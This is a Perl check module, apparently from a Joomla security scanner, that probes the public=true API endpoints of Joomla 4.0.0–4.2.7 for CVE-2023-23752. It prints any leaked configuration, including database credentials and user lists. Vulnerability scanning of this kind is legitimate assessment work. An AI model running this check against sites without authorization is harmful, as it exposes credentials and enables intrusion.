dprint("Checking Joomla API unauthenticated disclosure (CVE-2023-23752)");

do "$mepath/core/lib.pl";

my $jvnum = joomla_version_num($ver);

if($jvnum ne "" and !version_in_range($jvnum, "4.0.0", "4.2.7")){
    fprint("Joomla API endpoints are not readable (CVE-2023-23752 not applicable to Joomla $jvnum)");
}else{
    my $api_base = "$target/api/index.php/v1";

    my %api_endpoints = (
        'config/application?public=true' => 'config/application (DB credentials, site secret)',
        'users?public=true'               => 'users (user list)',
        'banners?public=true'             => 'banners',
        'contacts?public=true'            => 'contacts',
        'content?public=true'             => 'content (articles)',
        'menu?public=true'                => 'menu',
        'modules?public=true'             => 'modules (non-admin)',
        'messages?public=true'            => 'messages',
        'categories?public=true'          => 'categories',
        'fields?public=true'              => 'fields',
        'languages?public=true'           => 'languages',
        'plugins?public=true'             => 'plugins (entries)',
        'privacy/consents?public=true'    => 'privacy consents',
        'tags?public=true'                => 'tags',
        'templates/styles?public=true'    => 'template styles',
        'users/groups?public=true'        => 'user groups',
        'users/levels?public=true'        => 'user levels',
    );

    my $found = "";
    my $endpt = "";
    foreach my $ep (sort keys %api_endpoints){
        next if $found;
        my $res = $ua->get("$api_base/$ep");
        next unless $res->is_success;
        my $body = $res->decoded_content;
        next unless defined $body;

        next if $body =~ /^\s*</;

        if($body =~ /"(data|links|meta)"/i){
            my $has_secret = ($ep =~ /^config\// && $body =~ /(password|public|debug|log_path|tmp_path|session)/i);
            $found = $body;
            $endpt = $ep;
            if($has_secret){
                my $snip = $body;
                $snip =~ s/\s+/ /g;
                $snip = substr($snip, 0, 400);
                tprint("CVE-2023-23752 : Joomla! 4.0.0 - 4.2.7 - unauth information disclosure via $api_base/$endpt\n"
                      . "Snippet : $snip\n");
            }else{
                tprint("CVE-2023-23752 : Joomla! 4.0.0 - 4.2.7 - unauth information disclosure via $api_base/$endpt\n"
                      . "Response : " . substr($found, 0, 300) . "\n");
            }
            last;
        }
    }

    if(!$found){
        if($jvnum =~ /^4\./ && vers_cmp($jvnum, "4.2.8") < 0){
            fprint("API endpoints did not respond - the target may not expose /api/ (rewrites disabled), manual check advised for CVE-2023-23752");
        }else{
            fprint("Joomla API endpoints are not readable (CVE-2023-23752 not exploitable)");
        }
    }
}
